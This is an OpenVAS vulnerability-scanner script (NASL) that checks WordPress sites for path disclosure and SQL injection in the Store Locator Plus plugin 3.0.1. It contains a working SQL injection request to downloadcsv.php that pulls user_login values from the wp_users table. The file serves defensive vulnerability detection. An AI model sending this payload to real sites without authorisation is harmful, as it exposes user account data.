##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_store_locator_plus_mult_vuln.nasl 10028 2018-05-30 13:13:04Z cfischer $
#
# WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802644");
  script_version("$Revision: 10028 $");
  script_bugtraq_id(53795);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-05-30 15:13:04 +0200 (Wed, 30 May 2018) $");
  script_tag(name:"creation_date", value:"2012-06-21 12:12:12 +0530 (Thu, 21 Jun 2012)");
  script_name("WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49391");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/76094");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/store-locator-le/changelog/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to obtain sensitive
  information, compromise the application, access or modify data, exploit
  latent vulnerabilities in the underlying database.

  Impact Level: System/Application");
  script_tag(name : "affected" , value : "WordPress Google Maps Via Store Locator Plus Plugin version 3.0.1");
  script_tag(name : "insight" , value : "- An error exists due to the application displaying the installation path in
    debug output when accessing wp-content/plugins/store-locator-le/core/load_
    wp_config.php.

  - Input passed via the 'query' parameter to /wp-content/plugins/store-
    locator-le/downloadcsv.php is not properly sanitised before being used
    in a SQL query. This can be exploited to manipulate SQL queries by
    injecting arbitrary SQL code.");
  script_tag(name : "solution" , value : "Upgrade to Google Maps Via Store Locator Plus Plugin version 3.0.5 or later,

  For updates refer to http://wordpress.org/extend/plugins/store-locator-le");
  script_tag(name : "summary" , value : "This host is running WordPress Google Maps Via Store Locator Plus
  Plugin and is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

url = dir + "/wp-content/plugins/store-locator-le/downloadcsv.php";

host = http_host_name(port:port);

req = string(
       "POST ", url, " HTTP/1.1\r\n",
       "Host: ", host, "\r\n",
       "Content-Type: multipart/form-data; boundary=----------------------------7e0b3991dc3a\r\n",
       "Content-Length: 223\r\n\r\n",
       "------------------------------7e0b3991dc3a\r\n",
       'Content-Disposition: form-data; name="query"',"\r\n",
       "\r\n",
       "SELECT concat(0x4f70656e564153,0x3a,user_login,0x3a,0x4f70656e564153) FROM wp_users\r\n",
       "------------------------------7e0b3991dc3a--\r\n\r\n" );
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(res && res =~ "OpenVAS:(.+):OpenVAS"){
  security_message(port);
}
